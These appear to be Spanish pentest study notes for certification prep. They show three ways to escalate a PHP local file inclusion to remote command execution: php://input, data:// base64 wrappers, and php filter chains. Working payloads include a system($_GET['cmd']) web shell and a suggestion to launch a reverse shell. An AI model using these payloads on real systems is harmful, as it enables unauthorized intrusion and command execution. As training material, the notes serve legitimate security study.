# RCE a través de LFI


# Metodo 1

Con Burpsuite, en el repeater. Si hacemos clic derecho y cambiamos el tipo de petición de GET a POST (para no arrastrar errores al hacerlo manual) y escribimos:
<img src="https://raw.githubusercontent.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/main/images/lfi3.png" />

```
Justo después de POST
/?filename=php://input

Dependerá de la variable, en este caso en el index está definido filename pero normalmente debería figurar algo como "page"
```

Ahora debajo de la cabecera escribimos:
<img src="https://raw.githubusercontent.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/main/images/lfi4.png" />

```
<?php system("whoami"); ?>
```

En la respuesta veremos:

<img src="https://raw.githubusercontent.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/main/images/lfi5.png" />


# Metodo 2

En una petición por GET añadimos:
<img src="https://raw.githubusercontent.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/main/images/lfi6.png" /> 
<img src="https://raw.githubusercontent.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/main/images/lfi7.png" /> 

```
/?filename=data://text/plain;base64,la_cadena_anterior_en_base_64&cmd=whoami
```

Destacar que una vez pegado en codigo en base64, hay que hacer Ctrl+U para URLencodear el comando, ya que el "+" que hay al final en base64 significa un " " y lo interpretará mal y no funcionará.
<img src="https://raw.githubusercontent.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/main/images/lfi8.png" />  
<img src="https://raw.githubusercontent.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/main/images/lfi9.png" /> 

# Metodo 3

Con la herramienta php filter chain generator, automatizamos un modo de introducir caracteres, de manera que podriamos codificar una conversion de caracteres, que el navegador llegaría a interpretar y ejecutaría comandos. El uso es el siguiente:

```
php_filter_chain_generator-py --chain 'cadema de caracteres'
```
<img src="https://raw.githubusercontent.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/main/images/lfi10.png" /> 

ahora esta cadena la pegamos en el navegador de la siguiente manera:
```  
detrás de filename, page o lo que corresponda
localhost/?filename=todo el churraco
```

Cosa que nos devuelve el resultado del comando
<img src="https://raw.githubusercontent.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/main/images/lfi11.png" />  

# Metodo 3.1

de manera mas comoda, se podría incluir un GET cmd para incluir el comando al final del churraco en la barra del navegador.

Con la herramienta, codificamos:
```
php_filter_chain_generator-py --chain '<?php system($_GET["cmd"]); ?>'
```

<img src="https://raw.githubusercontent.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/main/images/lfi12.png" />  

Pegamos la cadena resultante y añadimos al final de la cadena:
```
CADENA&cmd=id
```
<img src="https://raw.githubusercontent.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/main/images/lfi13.png" />  

así que de esta manera podríamos en lugar de id, lanzar una reverse shell.

**OJO, CONVIENE URLENCODEAR LA REVERSE SHELL, O ALMENOS LOS "&"**

https://github.com/synacktiv/php_filter_chain_generator

